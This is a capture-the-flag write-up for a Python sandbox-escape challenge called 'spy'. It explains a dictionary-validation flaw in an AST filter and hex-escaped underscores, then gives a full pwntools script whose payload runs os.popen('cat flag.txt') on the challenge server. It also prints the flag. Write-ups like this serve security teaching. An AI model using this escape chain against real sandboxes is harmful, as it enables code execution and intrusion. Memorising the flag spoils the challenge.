# 🏆 Challenge Writeup: spy

![CTF](https://img.shields.io/badge/CTF-N7CTF-blue)
![Category](https://img.shields.io/badge/Category-Pwn%20%2F%20PyJail-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Points](https://img.shields.io/badge/Points-375-green)

## 📌 Challenge Information
- **Name:** spy
- **Author:** stars
- **Category:** Pwn / Misc (Python Sandbox Escape)
- **Points:** 375
- **Connection:** `nc 167.86.100.105 5006`

---

## 🧠 Challenge Description

The challenge presents a "Field Agent Encrypted Calculator". It is a restricted Python environment where an **AST (Abstract Syntax Tree)** security module validates every expression. The goal is to bypass these restrictions to perform a **Remote Code Execution (RCE)** and read `flag.txt`.

---

## 🔍 Initial Analysis

Upon connecting to the service, we interact with a Python 3.10 shell. The source code (`challenge.py`) reveals several layers of protection:

1.  **Blacklist:** Keywords like `getattr`, `os`, `import`, `eval`, and `exec` are strictly forbidden.
2.  **Character Filter:** The underscore `_` is banned to prevent access to magic methods (Dunder methods).
3.  **AST Validation:** The system parses the input using `ast.parse()` to ensure only safe expressions are executed.

---

## 🧪 Exploration & Failed Attempts

* **Attempting `math.__dict__`:** Blocked because of the `_` character.
* **Attempting `getattr(math, 'ceil')`:** Blocked because `getattr` is a forbidden keyword.
* **Attempting Unicode Bypass:** Using `math.＿＿loader＿＿` (Full-width underscores) failed because the Python interpreter treats them as invalid syntax before the security module even runs.

---

## ⚙️ Exploitation Process

### 1. The Dictionary Logic Bypass
A critical vulnerability was identified in the dictionary validation logic. The check was essentially:
`if not is_safe(key) and is_safe(value): return False`

By providing a dictionary where **both the key and the value are unsafe** (blacklisted), the logic bypasses the `return False` statement. This allowed us to retrieve the forbidden `getattr` function using:
`{math: getattr}.get(math)`

### 2. Hexadecimal Escape Sequences
Since the underscore `_` was filtered as a character, we used its hexadecimal representation: `\x5f`. Python strings automatically decode these, allowing us to build strings like `__class__` using `\x5f\x5fclass\x5f\x5f`.

### 3. Exploitation Path (Object Discovery)
Using `getattr` and hex encoding, we performed the following steps:
1.  **Access Class:** Use `[math].__class__` to get the `list` class.
2.  **Subclasses:** Use `list.__subclasses__()` to find a class with a global scope.
3.  **Builtins:** Access `__builtins__` from the globals of a subclass.
4.  **Import & Execute:** Use `__import__('os').popen('cat flag.txt').read()`.

---

## 🧾 Final Solve Script

```python
from pwn import *

# Configuration de la cible
HOST = '167.86.100.105'
PORT = 5006

# Le Payload (Bypass AST via faille dictionnaire + Encodage Hexa pour les underscores)
# On utilise double backslash \\ pour l'encodage hexa dans le script python
payload = (
    "{math: getattr}.get(math)("
    "{math: getattr}.get(math)("
    "{math: getattr}.get(math)("
    "{math: getattr}.get(math)("
    "{math: getattr}.get(math)([math], '\\x5f\\x5fclass\\x5f\\x5f'), "
    "'\\x5f\\x5fsubclasses\\x5f\\x5f')().pop(), "
    "'\\x5f\\x5finit\\x5f\\x5f'), "
    "'\\x5f\\x5fglobals\\x5f\\x5f'), 'get')('\\x5f\\x5fbuiltins\\x5f\\x5f')"
    ".get('\\x5f\\x5fimport\\x5f\\x5f')('os').popen('cat flag.txt').read()"
)

def solve():
    try:
        # Connexion au serveur
        io = remote(HOST, PORT)
        
        # Attendre l'invite de commande (agent@spyterminal:~$)
        io.recvuntil(b'agent@spyterminal:~$')
        
        log.info("Envoi du payload d'évasion AST...")
        
        # Envoi du payload
        io.sendline(payload.encode())
        
        # Récupération de la réponse (le flag)
        # On ignore la première ligne qui est souvent l'écho de la commande
        io.recvline() 
        flag = io.recvline().decode().strip()
        
        if "N7{" in flag:
            log.success(f"Flag trouvé : {flag}")
        else:
            # Si le flag n'est pas sur la ligne suivante, on lit tout
            print(flag)
            print(io.recvall().decode())

    except Exception as e:
        log.error(f"Erreur lors de l'exécution : {e}")
    finally:
        io.close()

if __name__ == "__main__":
    solve()
```
## 🚩 Flag
N7{Well_done_agent_your_name_must_be_celebrated}

## 💡Conclusion
The "spy" challenge demonstrates that even with AST-based hardening, small logical errors in the validation of data structures (like dictionaries) can lead to a complete sandbox escape. Security must be applied consistently across all parsed object types.
